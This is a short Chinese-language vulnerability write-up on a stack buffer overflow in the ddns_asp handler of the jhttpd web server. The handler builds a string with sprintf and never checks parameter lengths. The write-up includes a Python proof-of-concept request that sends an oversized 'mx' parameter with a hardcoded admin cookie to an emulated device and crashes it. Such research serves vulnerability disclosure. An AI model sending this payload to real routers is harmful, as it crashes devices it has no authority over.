在jhttpd的ddns_asp函数中，会获取若干参数

![img](file:///picture\pic1.png) 

![img](file:///picture\pic2.png) 

如果opt=add，那么后面的参数会通过sprintf函数被拼接到栈上变量

![img](file:///picture\pic3.png) 

由于未对参数长度进行校验，导致在拼接时会由于参数过长造成栈溢出漏洞

还是利用FirmAE可以直接进行模拟，连接shell，在里面运行jhttpd

![img](file:///picture\pic4.png) 

然后发送payload

import requests
url="http://192.168.0.1/ddns.asp?opt=add&mx="+'0'*0x1000
headers={"cookie":"wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"}
response=requests.get(url=url,headers=headers)
print(response.text)

发现jhttpd发生了段错误，由此证明漏洞存在

![img](file:///picture\pic5.png) 
